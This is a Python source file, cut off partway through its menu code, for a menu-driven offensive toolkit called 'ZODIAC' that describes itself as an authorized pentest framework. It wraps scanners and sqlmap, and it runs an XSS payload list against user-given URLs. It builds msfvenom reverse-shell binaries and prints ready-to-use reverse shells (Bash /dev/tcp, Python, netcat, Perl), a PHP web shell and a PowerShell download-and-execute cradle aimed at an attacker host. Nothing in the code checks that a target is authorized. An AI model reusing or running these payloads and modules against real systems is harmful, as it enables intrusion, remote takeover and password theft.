#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#   ███████╗ ██████╗ ██████╗ ██╗ █████╗  ██████╗
#   ╚══███╔╝██╔═══██╗██╔══██╗██║██╔══██╗██╔════╝
#     ███╔╝ ██║   ██║██║  ██║██║███████║██║
#    ███╔╝  ██║   ██║██║  ██║██║██╔══██║██║
#   ███████╗╚██████╔╝██████╔╝██║██║  ██║╚██████╗
#   ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝
# ============================================================
#   ZODIAC — Cyber Pentest Framework v3.1
#   Authorized Penetration Testing Tool
#   Fully debugged, cross-platform, production-ready
# ============================================================

import os
import sys
import subprocess
import platform
import socket
import json
import time
import random
import threading
import signal
import shutil
import shlex
import urllib.request
import urllib.parse
import urllib.error
import hashlib
import tempfile
import traceback
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Callable, Tuple, Any, Union

# ============================================================
# PLATFORM DETECTION
# ============================================================
IS_WINDOWS = platform.system() == 'Windows'
IS_ANDROID = bool(os.environ.get('PREFIX', '').startswith('/data/data/com.termux'))
IS_LINUX = platform.system() == 'Linux' and not IS_ANDROID
CURRENT_DIR = Path(__file__).parent.resolve() if '__file__' in dir() else Path.cwd()
OUTPUT_DIR = CURRENT_DIR / 'output'
CONFIG_DIR = CURRENT_DIR / 'config'
WORDLIST_DIR = CURRENT_DIR / 'wordlists'

# ============================================================
# COLOR SYSTEM (safe everywhere)
# ============================================================
class C:
    """Cross-platform color system. Graceful degradation for non-TTY."""
    _use_color = sys.stdout.isatty() and not IS_WINDOWS
    
    R = '\033[91m' if _use_color else ''
    G = '\033[92m' if _use_color else ''
    Y = '\033[93m' if _use_color else ''
    B = '\033[94m' if _use_color else ''
    M = '\033[95m' if _use_color else ''
    C = '\033[96m' if _use_color else ''
    W = '\033[97m' if _use_color else ''
    BL = '\033[90m' if _use_color else ''
    BG_R = '\033[101m' if _use_color else ''
    BG_G = '\033[102m' if _use_color else ''
    BG_B = '\033[104m' if _use_color else ''
    BG_M = '\033[105m' if _use_color else ''
    BG_C = '\033[106m' if _use_color else ''
    BG_Y = '\033[103m' if _use_color else ''
    BD = '\033[1m' if _use_color else ''
    DM = '\033[2m' if _use_color else ''
    RS = '\033[0m' if _use_color else ''
    RV = '\033[7m' if _use_color else ''

# ============================================================
# CONSTANTS
# ============================================================
VERSION = "3.1"
PROJECT = "ZODIAC"

# ============================================================
# PATCH 1: EMBLEM (Fix + No Misalignment)
# ============================================================
ZODIAC_EMBLEM = f"""
{C.BL}{C.BD}
        ╭────────────────────────────╮
        │        Z O D I A C         │
        │   PENTEST FRAMEWORK v3.1   │
        ╰────────────────────────────╯
        ┌────────────────────────────┐
        │   RECON → EXPLOIT → PWN    │
        └────────────────────────────┘
{C.RS}
"""

# ============================================================
# SAFE TEXT (PATCH 6: Fix emoji/wrap issues)
# ============================================================
def safe_text(text: str) -> str:
    """Remove problematic characters that cause terminal wrapping."""
    return text.encode("utf-8", "ignore").decode()

# ============================================================
# CROSS-PLATFORM UTILITIES
# ============================================================

# ============================================================
# PATCH 2: Safe terminal width (completely stable in Termux/Kali)
# ============================================================
def safe_terminal_width() -> int:
    try:
        w = shutil.get_terminal_size((80, 20)).columns
        return 80 if w < 80 else (100 if w > 100 else w)
    except:
        return 80

def pad(text: str, size: int) -> str:
    """Pad text to fixed width."""
    t = safe_text(text)
    return f"{t:<{size}}"

def clear_screen():
    """Cross-platform screen clear."""
    if sys.stdout.isatty():
        os.system('cls' if IS_WINDOWS else 'clear')

def pause_screen():
    """Pause with prompt, skip if non-TTY."""
    if sys.stdout.isatty():
        try:
            input(f"\n{C.C}{C.BD}[PRESS ENTER TO CONTINUE...]{C.RS}")
        except (EOFError, KeyboardInterrupt):
            pass

def safe_input(prompt: str = "", default: str = "") -> str:
    """Get input safely with fallback for non-TTY."""
    try:
        if sys.stdout.isatty():
            return input(prompt).strip()
        return default
    except (EOFError, KeyboardInterrupt):
        return default

def typing_effect(text: str, speed: float = 0.03):
    """Print with typing animation (TTY only)."""
    if sys.stdout.isatty():
        for ch in safe_text(text):
            print(ch, end='', flush=True)
            time.sleep(speed)
        print()
    else:
        print(safe_text(text))

# ============================================================
# TOOL DETECTION
# ============================================================
def check_tool(tool_name: str) -> bool:
    """Check if a tool is available. Uses shutil.which()."""
    if not tool_name or not isinstance(tool_name, str):
        return False
    try:
        return shutil.which(tool_name) is not None
    except (OSError, PermissionError, AttributeError):
        return False

# ============================================================
# SAFE COMMAND EXECUTION
# ============================================================
def safe_run_cmd(
    cmd: Union[List[str], str],
    timeout: int = 300,
    shell: bool = False
) -> Optional[subprocess.CompletedProcess]:
    """Execute a command safely."""
    if not cmd:
        return None
    
    try:
        if shell:
            if isinstance(cmd, list):
                cmd_str = ' '.join(shlex.quote(str(c)) for c in cmd)
            else:
                cmd_str = cmd
            return subprocess.run(cmd_str, shell=True, capture_output=True, text=True, timeout=timeout)
        else:
            if isinstance(cmd, str):
                cmd = shlex.split(cmd)
            return subprocess.run([str(c) for c in cmd], capture_output=True, text=True, timeout=timeout)
    
    except subprocess.TimeoutExpired:
        log_debug(f"Command timed out ({timeout}s): {str(cmd)[:60]}")
        return None
    except FileNotFoundError:
        log_debug(f"Command not found: {str(cmd)[:60]}")
        return None
    except PermissionError:
        log_debug(f"Permission denied: {str(cmd)[:60]}")
        return None
    except OSError as e:
        log_debug(f"OS error: {e}")
        return None
    except Exception as e:
        log_debug(f"Unexpected error: {e}")
        return None

# ============================================================
# LOGGING
# ============================================================
_LOG_LEVEL = 1

def log_debug(msg: str):
    if _LOG_LEVEL <= 0:
        print(f"{C.BL}[DEBUG] {safe_text(msg)}{C.RS}")

def log_info(msg: str):
    if _LOG_LEVEL <= 1:
        print(f"{C.C}[*] {safe_text(msg)}{C.RS}")

def log_warning(msg: str):
    if _LOG_LEVEL <= 2:
        print(f"{C.Y}[!] {safe_text(msg)}{C.RS}")

def log_error(msg: str):
    if _LOG_LEVEL <= 3:
        print(f"{C.R}[ERR] {safe_text(msg)}{C.RS}")

def log_success(msg: str):
    print(f"{C.G}[+] {safe_text(msg)}{C.RS}")

def section_header(text: str, color=C.M):
    w = safe_terminal_width() - 4
    print(f"\n{C.BL}╔{'═'*(w+2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS} {color}{C.BD}{safe_text(text).center(w)}{C.RS} {C.BL}║{C.RS}")
    print(f"{C.BL}╚{'═'*(w+2)}╝{C.RS}\n")

# ============================================================
# CONFIGURATION
# ============================================================
DEFAULT_CONFIG = {
    'wordlist_dir': str(WORDLIST_DIR),
    'output_dir': str(OUTPUT_DIR),
    'timeout': 300,
    'threads': 50,
    'user_agent': 'ZODIAC/3.1',
    'log_level': 1,
    'dns_server': '8.8.8.8',
}

def load_config() -> dict:
    config = DEFAULT_CONFIG.copy()
    config_path = CONFIG_DIR / 'zodiac.conf'
    try:
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        if config_path.exists():
            with open(config_path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        key, _, val = line.partition('=')
                        key, val = key.strip(), val.strip()
                        if key in config:
                            if isinstance(config[key], int):
                                config[key] = int(val)
                            else:
                                config[key] = val
        else:
            with open(config_path, 'w') as f:
                f.write(f"# {PROJECT} Configuration\n# Generated: {datetime.now()}\n\n")
                for k, v in DEFAULT_CONFIG.items():
                    f.write(f"{k}={v}\n")
    except (OSError, PermissionError, ValueError) as e:
        log_warning(f"Config: {e}")
    return config

CONFIG = load_config()

# ============================================================
# ROOT DETECTION
# ============================================================
def is_root() -> bool:
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    try:
        return os.geteuid() == 0
    except AttributeError:
        return False

IS_ROOT = is_root()

# ============================================================
# WORDLIST HELPERS
# ============================================================
COMMON_DIRS = ['admin', 'login', 'wp-admin', 'backup', 'config', 'test',
               'api', '.git', '.env', 'robots.txt', 'dashboard', 'panel',
               'uploads', 'assets', 'static', 'public', 'private', 'secret']

COMMON_PASSWORDS = ['123456', 'password', 'admin', '12345678', 'qwerty',
                    'letmein', 'welcome', 'monkey', 'dragon', 'football',
                    'pass123', 'root', 'toor', 'changeme', '1234']

def get_wordlist_path(name: str = 'common.txt') -> Optional[Path]:
    search_paths = [
        WORDLIST_DIR / name,
        Path('/usr/share/wordlists') / name,
        Path('/usr/share/dirb/wordlists') / name,
        Path('/usr/share/dirbuster/wordlists') / name,
        Path('/data/data/com.termux/files/usr/share/wordlists') / name,
    ]
    for path in search_paths:
        if path.exists() and path.is_file():
            return path
    return None

# ============================================================
# MODULE RESULT
# ============================================================
class ModuleResult:
    def __init__(self, success: bool, message: str = "", data: Any = None):
        self.success = success
        self.message = message
        self.data = data
        self.timestamp = datetime.now()

# ============================================================
# MODULES
# ============================================================

def module_nmap_scan() -> ModuleResult:
    section_header("NMAP PORT SCANNER", C.C)
    target = safe_input(f" {C.Y}Target IP/Hostname -> {C.RS}")
    if not target:
        return ModuleResult(False, "No target provided")
    scan_type = safe_input(f" {C.Y}Scan type (quick/full/stealth/vuln) [quick] -> {C.RS}").strip().lower() or "quick"
    flags = {
        'quick': ['-T4', '-F'],
        'full': ['-p-', '-T4'],
        'stealth': ['-sS', '-T2'],
        'vuln': ['--script=vuln', '-T4'],
    }
    flag_list = flags.get(scan_type, ['-T4', '-F'])
    if not check_tool('nmap'):
        log_error("nmap not found. Install: apt install nmap")
        pause_screen()
        return ModuleResult(False, "nmap not available")
    log_info(f"Scanning {target} [{scan_type}]...")
    result = safe_run_cmd(['nmap'] + flag_list + [target], timeout=600)
    if result and result.stdout:
        print(f"\n{C.G}{result.stdout[:3000]}{C.RS}")
        if len(result.stdout) > 3000:
            log_info(f"Output truncated ({len(result.stdout)} bytes total)")
        out_path = OUTPUT_DIR / f"nmap_{datetime.now():%Y%m%d_%H%M%S}.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'w') as f:
                f.write(result.stdout)
            log_success(f"Saved: {out_path}")
        except OSError as e:
            log_warning(f"Save failed: {e}")
    else:
        log_error("nmap returned no output")
    pause_screen()
    return ModuleResult(bool(result and result.stdout), "NMAP scan completed")


def module_subdomain_enum() -> ModuleResult:
    section_header("SUBDOMAIN ENUMERATION", C.C)
    domain = safe_input(f" {C.Y}Domain -> {C.RS}")
    if not domain:
        return ModuleResult(False, "No domain provided")
    found = []
    if check_tool('sublist3r'):
        log_info("Running sublist3r...")
        result = safe_run_cmd(['sublist3r', '-d', domain], timeout=120)
        if result and result.stdout:
            print(f"{C.G}{result.stdout[:2000]}{C.RS}")
            found.extend(result.stdout.strip().splitlines())
    elif check_tool('subfinder'):
        log_info("Running subfinder...")
        result = safe_run_cmd(['subfinder', '-d', domain, '-silent'], timeout=120)
        if result and result.stdout:
            for line in result.stdout.strip().splitlines():
                if line.strip():
                    print(f" {C.G}+ {line}{C.RS}")
                    found.append(line)
    else:
        log_warning("sublist3r/subfinder not found. Using DNS fallback.")
        common = ['www', 'mail', 'admin', 'api', 'dev', 'test', 'vpn', 'ftp', 'blog', 'shop', 'cdn']
        for sub in common:
            try:
                host = f"{sub}.{domain}"
                ip = socket.gethostbyname(host)
                print(f" {C.G}+ {host} -> {ip}{C.RS}")
                found.append(f"{host} -> {ip}")
            except:
                pass
    if found:
        out_path = OUTPUT_DIR / f"subdomains_{domain.replace('.', '_')}.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'w') as f:
                f.write('\n'.join(str(x) for x in found))
            log_success(f"Saved: {out_path} ({len(found)} entries)")
        except OSError as e:
            log_warning(f"Save failed: {e}")
    log_info(f"Found {len(found)} subdomains")
    pause_screen()
    return ModuleResult(len(found) > 0, f"Found {len(found)} subdomains", found)


def module_dns_enum() -> ModuleResult:
    section_header("DNS ENUMERATION", C.C)
    target = safe_input(f" {C.Y}Target Domain -> {C.RS}")
    if not target:
        return ModuleResult(False, "No target provided")
    dns_server = safe_input(f" {C.Y}DNS Server [8.8.8.8] -> {C.RS}") or "8.8.8.8"
    if not check_tool('dig'):
        log_error("dig not found. Install: apt install dnsutils")
        pause_screen()
        return ModuleResult(False, "dig not available")
    record_types = ['any', 'mx', 'ns', 'soa', 'txt', 'aaaa']
    results = {}
    for rtype in record_types:
        log_info(f"Querying {rtype} records...")
        result = safe_run_cmd(['dig', rtype, target, f'@{dns_server}', '+short'], timeout=30)
        if result and result.stdout:
            output = result.stdout.strip()
            if output:
                print(f"{C.G}[{rtype.upper()}]{C.RS}")
                for line in output.splitlines()[:10]:
                    if line.strip():
                        print(f"    {line}")
                results[rtype] = output.splitlines()
    log_info("Attempting zone transfer (AXFR)...")
    result = safe_run_cmd(['dig', 'axfr', target, f'@{dns_server}', '+short'], timeout=15)
    if result and result.stdout:
        print(f"{C.Y}[!] AXFR returned data!{C.RS}")
        print(f"{C.G}{result.stdout[:1500]}{C.RS}")
        results['axfr'] = result.stdout.strip().splitlines()
    else:
        log_info("Zone transfer denied")
    pause_screen()
    return ModuleResult(len(results) > 0, "DNS enumeration completed", results)


def module_osint() -> ModuleResult:
    section_header("OSINT GATHERING", C.C)
    target = safe_input(f" {C.Y}Target (domain/email/ip) -> {C.RS}")
    if not target:
        return ModuleResult(False, "No target provided")
    if check_tool('whois'):
        log_info("Running whois...")
        result = safe_run_cmd(['whois', target], timeout=30)
        if result and result.stdout:
            print(f"{C.G}{result.stdout[:1500]}{C.RS}")
            out_path = OUTPUT_DIR / f"whois_{target.replace('.', '_')}.txt"
            try:
                OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
                with open(out_path, 'w') as f:
                    f.write(result.stdout)
                log_success(f"Saved: {out_path}")
            except OSError as e:
                log_warning(f"Save failed: {e}")
    else:
        log_warning("whois not available")
    if check_tool('theHarvester'):
        log_info("Running theHarvester...")
        result = safe_run_cmd(['theHarvester', '-d', target, '-l', '100', '-b', 'google'], timeout=60)
        if result and result.stdout:
            print(f"{C.G}{result.stdout[:2000]}{C.RS}")
    else:
        log_warning("theHarvester not available")
    pause_screen()
    return ModuleResult(True, "OSINT completed")


def module_sql_injection() -> ModuleResult:
    section_header("SQL INJECTION SCANNER", C.R)
    url = safe_input(f" {C.Y}Target URL (with param) -> {C.RS}")
    if not url:
        return ModuleResult(False, "No URL provided")
    if not check_tool('sqlmap'):
        log_error("sqlmap not installed")
        pause_screen()
        return ModuleResult(False, "sqlmap not available")
    level_str = safe_input(f" {C.Y}Risk level (1-5) [3] -> {C.RS}") or "3"
    try:
        level = max(1, min(5, int(level_str)))
    except ValueError:
        level = 3
    log_info(f"Running sqlmap on {url} (level={level})...")
    result = safe_run_cmd(['sqlmap', '-u', url, '--batch', f'--level={level}', '--risk=3'], timeout=600)
    if result:
        if result.stdout:
            print(f"{C.G}{result.stdout[-2000:]}{C.RS}")
        if result.stderr:
            log_warning(f"stderr: {result.stderr[:300]}")
    else:
        log_error("sqlmap execution failed")
    pause_screen()
    return ModuleResult(bool(result and result.returncode == 0), "SQL injection scan completed")


def module_xss_scanner() -> ModuleResult:
    section_header("XSS VULNERABILITY SCANNER", C.R)
    url = safe_input(f" {C.Y}Target URL (e.g. http://site.com/search) -> {C.RS}")
    if not url:
        return ModuleResult(False, "No URL provided")
    param = safe_input(f" {C.Y}Parameter name -> {C.RS}")
    if not param:
        return ModuleResult(False, "No parameter provided")
    payloads = [
        ('<script>alert(1)</script>', 'basic_script'),
        ('"><script>alert(1)</script>', 'attr_break'),
        ('<img src=x onerror=alert(1)>', 'img_onerror'),
        ('" onfocus=alert(1) autofocus="', 'event_handler'),
        ('<svg/onload=alert(1)>', 'svg'),
        ('<scr<script>ipt>alert(1)</scr</script>ipt>', 'nested_bypass'),
        ('" autofocus onfocus="alert(1)', 'autofocus'),
    ]
    headers = {'User-Agent': CONFIG['user_agent']}
    detected = []
    for payload, ptype in payloads:
        try:
            test_url = f"{url.rstrip('?')}?{param}={urllib.parse.quote(payload)}"
            req = urllib.request.Request(test_url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode('utf-8', errors='replace')
                status = resp.status
                if payload in body or urllib.parse.unquote(payload) in body:
                    log_success(f"[{ptype}] XSS DETECTED! (HTTP {status})")
                    detected.append((payload, ptype, status))
                else:
                    log_info(f"[{ptype}] Not reflected (HTTP {status})")
        except urllib.error.HTTPError as e:
            log_warning(f"[{ptype}] HTTP {e.code}")
        except urllib.error.URLError as e:
            log_warning(f"[{ptype}] Connection error: {e.reason}")
        except Exception as e:
            log_debug(f"[{ptype}] {e}")
    if detected:
        out_path = OUTPUT_DIR / f"xss_{datetime.now():%Y%m%d_%H%M%S}.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'w') as f:
                for p, t, s in detected:
                    f.write(f"[{t}] HTTP {s}: {p}\n")
            log_success(f"Results: {out_path}")
        except OSError as e:
            log_warning(f"Save failed: {e}")
    else:
        log_info("No XSS detected")
    pause_screen()
    return ModuleResult(len(detected) > 0, f"Found {len(detected)} XSS vectors", detected)


def module_metasploit() -> ModuleResult:
    section_header("METASPLOIT LAUNCHER", C.R)
    if not check_tool('msfconsole'):
        log_error("Metasploit not found")
        pause_screen()
        return ModuleResult(False, "Metasploit not available")
    print(f" {C.Y}[1] Start msfconsole")
    print(f" {C.Y}[2] Generate payloads")
    choice = safe_input(f"\n {C.Y}Choice -> {C.RS}") or "1"
    if choice == '1':
        log_info("Starting msfconsole...")
        try:
            subprocess.run(['msfconsole', '-q'], timeout=3600)
        except:
            pass
    elif choice == '2':
        lhost = safe_input(f" {C.Y}LHOST -> {C.RS}")
        lport = safe_input(f" {C.Y}LPORT [4444] -> {C.RS}") or "4444"
        if not lhost:
            return ModuleResult(False, "No LHOST")
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        payloads = [
            ('linux/x64/shell_reverse_tcp', 'elf', 'rev_shell_x64.elf'),
            ('linux/x86/shell_reverse_tcp', 'elf', 'rev_shell_x86.elf'),
            ('android/meterpreter/reverse_tcp', 'apk', 'zodiac_payload.apk'),
            ('windows/x64/meterpreter/reverse_tcp', 'exe', 'rev_shell_win64.exe'),
        ]
        for payload, fmt, fname in payloads:
            out_file = OUTPUT_DIR / fname
            cmd = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', fmt, '-o', str(out_file)]
            log_info(f"Generating {fname}...")
            result = safe_run_cmd(cmd, timeout=60)
            if result and result.returncode == 0 and out_file.exists():
                log_success(f"Created: {out_file}")
            else:
                log_warning(f"Failed: {fname}")
    pause_screen()
    return ModuleResult(True, "Metasploit completed")


def module_dir_buster() -> ModuleResult:
    section_header("DIRECTORY BUSTER", C.M)
    url = safe_input(f" {C.Y}Target URL (e.g. http://site.com) -> {C.RS}")
    if not url:
        return ModuleResult(False, "No URL provided")
    url = url.rstrip('/')
    found = []
    if check_tool('gobuster'):
        wordlist = get_wordlist_path('common.txt')
        if wordlist:
            log_info(f"Running gobuster with {wordlist}...")
            cmd = ['gobuster', 'dir', '-u', url, '-w', str(wordlist), '-t', str(CONFIG['threads']), '-q']
            result = safe_run_cmd(cmd, timeout=120)
            if result and result.stdout:
                print(f"{C.G}{result.stdout}{C.RS}")
                for line in result.stdout.splitlines():
                    if line.strip():
                        found.append(line.strip())
    log_info("Testing common directories via HTTP...")
    headers = {'User-Agent': CONFIG['user_agent']}
    for d in COMMON_DIRS:
        try:
            test_url = f"{url}/{d}"
            req = urllib.request.Request(test_url, method='HEAD', headers=headers)
            with urllib.request.urlopen(req, timeout=5) as resp:
                if resp.status < 400:
                    print(f" {C.G}+ Found: {test_url} [{resp.status}]{C.RS}")
                    found.append(test_url)
        except urllib.error.HTTPError as e:
            if e.code == 403:
                print(f" {C.Y}! {test_url} [403]{C.RS}")
                found.append(test_url)
        except:
            pass
    if found:
        out_path = OUTPUT_DIR / f"dirs_{datetime.now():%Y%m%d_%H%M%S}.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'w') as f:
                f.write('\n'.join(found))
            log_success(f"Saved: {out_path} ({len(found)} items)")
        except OSError as e:
            log_warning(f"Save failed: {e}")
    log_info(f"Found {len(found)} directories")
    pause_screen()
    return ModuleResult(len(found) > 0, f"Found {len(found)} items", found)


def module_linux_privesc() -> ModuleResult:
    section_header("LINUX PRIVILEGE ESCALATION", C.R)
    if IS_WINDOWS:
        log_error("Linux only")
        pause_screen()
        return ModuleResult(False, "Wrong platform")
    results = {}
    log_info("Kernel version:")
    r = safe_run_cmd(['uname', '-a'], timeout=5)
    if r and r.stdout:
        print(f"   {C.G}{r.stdout.strip()}{C.RS}")
        results['kernel'] = r.stdout.strip()
    log_info("SUID binaries...")
    r = safe_run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20", timeout=30, shell=True)
    if r and r.stdout:
        for line in r.stdout.strip().splitlines():
            if line.strip():
                print(f"   {C.G}{line}{C.RS}")
        results['suid'] = r.stdout.strip().splitlines()
    log_info("Sudo permissions...")
    r = safe_run_cmd(['sudo', '-l', '-n'], timeout=10)
    if r and r.stdout:
        print(f"   {C.G}{r.stdout.strip()}{C.RS}")
        results['sudo'] = r.stdout.strip()
    else:
        print(f"   {C.Y}No sudo or requires password{C.RS}")
    log_info("Capabilities...")
    r = safe_run_cmd("getcap -r / 2>/dev/null | head -20", timeout=30, shell=True)
    if r and r.stdout:
        for line in r.stdout.strip().splitlines():
            if line.strip():
                print(f"   {C.G}{line}{C.RS}")
        results['caps'] = r.stdout.strip().splitlines()
    log_info("Cron jobs...")
    r = safe_run_cmd("ls -la /etc/cron* 2>/dev/null", timeout=10, shell=True)
    if r and r.stdout:
        print(f"   {C.G}{r.stdout.strip()[:1000]}{C.RS}")
        results['cron'] = r.stdout.strip()
    pause_screen()
    return ModuleResult(len(results) > 0, "Privesc checks completed", results)


def module_network_scan() -> ModuleResult:
    section_header("NETWORK HOST DISCOVERY", C.C)
    subnet = safe_input(f" {C.Y}Subnet (e.g. 192.168.1.0/24) -> {C.RS}")
    if not subnet:
        subnet = "192.168.1.0/24"
    alive = []
    if check_tool('nmap'):
        log_info("Using nmap ping sweep...")
        r = safe_run_cmd(['nmap', '-sn', '-T5', subnet], timeout=120)
        if r and r.stdout:
            for line in r.stdout.splitlines():
                if 'Nmap scan report for' in line:
                    ip = line.split()[-1].strip('()')
                    print(f" {C.G}+ {ip}{C.RS}")
                    alive.append(ip)
    else:
        log_info("Using ping sweep...")
        base_parts = subnet.split('/')[0].split('.')
        if len(base_parts) < 4:
            log_error("Invalid subnet")
            pause_screen()
            return ModuleResult(False, "Invalid subnet")
        base = '.'.join(base_parts[:3])
        for i in range(1, 255):
            ip = f"{base}.{i}"
            if IS_WINDOWS:
                r = safe_run_cmd(['ping', '-n', '1', '-w', '1000', ip], timeout=3)
            else:
                r = safe_run_cmd(['ping', '-c', '1', '-W', '1', ip], timeout=3)
            if r and r.returncode == 0:
                print(f" {C.G}+ {ip} alive{C.RS}")
                alive.append(ip)
    if alive:
        out_path = OUTPUT_DIR / f"live_hosts_{datetime.now():%Y%m%d_%H%M%S}.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'w') as f:
                f.write('\n'.join(alive))
            log_success(f"Saved: {out_path} ({len(alive)} hosts)")
        except OSError as e:
            log_warning(f"Save failed: {e}")
    log_info(f"Found {len(alive)} hosts")
    pause_screen()
    return ModuleResult(len(alive) > 0, f"Found {len(alive)} hosts", alive)


def module_hash_cracker() -> ModuleResult:
    section_header("HASH CRACKER", C.Y)
    target_hash = safe_input(f" {C.Y}Hash -> {C.RS}")
    if not target_hash:
        return ModuleResult(False, "No hash provided")
    length_map = {32: 'md5', 40: 'sha1', 64: 'sha256', 128: 'sha512'}
    hash_type = length_map.get(len(target_hash), 'unknown')
    if hash_type == 'unknown':
        hash_type = safe_input(f" {C.Y}Hash type (md5/sha1/sha256/sha512) -> {C.RS}") or "md5"
    log_info(f"Detected: {hash_type} ({len(target_hash)} chars)")
    wordlist_path = get_wordlist_path('rockyou.txt')
    cracked = None
    if check_tool('hashcat') and wordlist_path:
        mode_map = {'md5': '0', 'sha1': '100', 'sha256': '1400', 'sha512': '1700'}
        mode = mode_map.get(hash_type, '0')
        log_info(f"Running hashcat...")
        r = safe_run_cmd(['hashcat', '-m', mode, '-a', '0', target_hash, str(wordlist_path), '--force', '-O'], timeout=120)
        if r and r.returncode in (0, 1):
            potfile_path = Path.home() / '.hashcat' / 'hashcat.potfile'
            if potfile_path.exists():
                try:
                    with open(potfile_path) as f:
                        for line in f:
                            line = line.strip()
                            if target_hash in line and ':' in line:
                                cracked = line.split(':')[-1]
                                break
                except:
                    pass
    if not cracked:
        log_info("Trying common passwords...")
        for p in COMMON_PASSWORDS:
            computed = None
            if hash_type == 'md5':
                computed = hashlib.md5(p.encode()).hexdigest()
            elif hash_type == 'sha1':
                computed = hashlib.sha1(p.encode()).hexdigest()
            elif hash_type == 'sha256':
                computed = hashlib.sha256(p.encode()).hexdigest()
            elif hash_type == 'sha512':
                computed = hashlib.sha512(p.encode()).hexdigest()
            if computed == target_hash:
                cracked = p
                break
    if cracked:
        log_success(f"Cracked: {cracked}")
        out_path = OUTPUT_DIR / "cracked_hashes.txt"
        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            with open(out_path, 'a') as f:
                f.write(f"{target_hash}:{cracked}\n")
        except:
            pass
    else:
        log_warning("Not cracked")
    pause_screen()
    return ModuleResult(cracked is not None, f"Cracked: {cracked}" if cracked else "Not cracked")


def module_payloads() -> ModuleResult:
    section_header("CUSTOM PAYLOAD GENERATOR", C.R)
    lhost = safe_input(f" {C.Y}LHOST -> {C.RS}")
    lport = safe_input(f" {C.Y}LPORT [4444] -> {C.RS}") or "4444"
    if not lhost:
        return ModuleResult(False, "No LHOST")
    payloads = {
        '1': ('Python', f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"),
        '2': ('Bash', f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        '3': ('PHP', f"<?php system($_GET['cmd']); ?>"),
        '4': ('Netcat', f"nc -e /bin/bash {lhost} {lport}"),
        '5': ('PowerShell', f'powershell -NoP -NonI -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString(\'http://{lhost}/ps.ps1\')"'),
        '6': ('Perl', f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''),
    }
    print(f"\n{C.G}{C.BD}{'='*50}{C.RS}")
    for key, (name, payload) in payloads.items():
        print(f"\n{C.Y}[{key}] {name}{C.RS}")
        print(f"{C.BL}{'-'*30}{C.RS}")
        print(f"{C.C}{payload[:200]}{C.RS}")
    print(f"\n{C.G}{C.BD}{'='*50}{C.RS}")
    save = safe_input(f"\n {C.Y}Save? (number/all/n) -> {C.RS}").lower()
    if save in payloads or save == 'all':
        OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
        if save == 'all':
            for key, (name, payload) in payloads.items():
                fname = f"payload_{name.lower()}.txt"
                try:
                    with open(OUTPUT_DIR / fname, 'w') as f:
                        f.write(payload)
                    log_success(f"Saved: {fname}")
                except:
                    pass
        else:
            name, payload = payloads[save]
            fname = f"payload_{name.lower()}.txt"
            try:
                with open(OUTPUT_DIR / fname, 'w') as f:
                    f.write(payload)
                log_success(f"Saved: {fname}")
            except:
                pass
    pause_screen()
    return ModuleResult(True, "Payloads displayed")


# ============================================================
# MENU SYSTEM
# ============================================================

MENU = {
    '1': ('RECONNAISSANCE', [
        ('01', 'NMAP Port Scanner', module_nmap_scan, 'Full port & service discovery'),
        ('02', 'Subdomain Enumeration', module_subdomain_enum, 'Find hidden subdomains'),
        ('03', 'DNS Enumeration', module_dns_enum, 'DNS records & zone transfer'),
        ('04', 'OSINT & WHOIS', module_osint, 'Open-source intelligence gathering'),
    ]),
    '2': ('EXPLOITATION', [
        ('05', 'SQL Injection Scanner', module_sql_injection, 'Automated sqlmap scanning'),
        ('06', 'XSS Scanner', module_xss_scanner, 'Cross-site scripting detection'),
        ('07', 'Metasploit Launcher', module_metasploit, 'MSF console & payload gen'),
    ]),
    '3': ('WEB ATTACK', [
        ('08', 'Directory Buster', module_dir_buster, 'Find hidden files & directories'),
    ]),
    '4': ('PRIVILEGE ESCALATION', [
        ('09', 'Linux Privesc Checks', module_linux_privesc, 'SUID, capabilities, cron'),
    ]),
    '5': ('NETWORK', [
        ('10', 'Host Discovery', module_network_scan, 'Find active hosts on subnet'),
    ]),
    '6': ('CRYPTO', [
        ('11', 'Hash Cracker', module_hash_cracker, 'MD5/SHA1/SHA256/SHA512 cracking'),
    ]),
    '7': ('PAYLOADS', [
        ('12', 'Payload Generator', module_payloads, 'Bash, Python, PHP, PowerShell'),
    ]),
}

# ============================================================
# PATCH 3 + 4: MAIN MENU (clean header, aligned items)
# ============================================================
def print_main_menu():
    """Display main menu with clean alignment."""
    clear_screen()
    print(ZODIAC_EMBLEM)
    
    w = safe_terminal_width()
    
    # PATCH 4: Clean header
    print(f"{C.BL}╔{'═'*(w-2)}╗{C.RS}")
    print(f"{C.BL}║{C.RS} {C.BD}{PROJECT} v{VERSION}{C.RS}{' '*(w-18)}{C.BL}║{C.RS}")
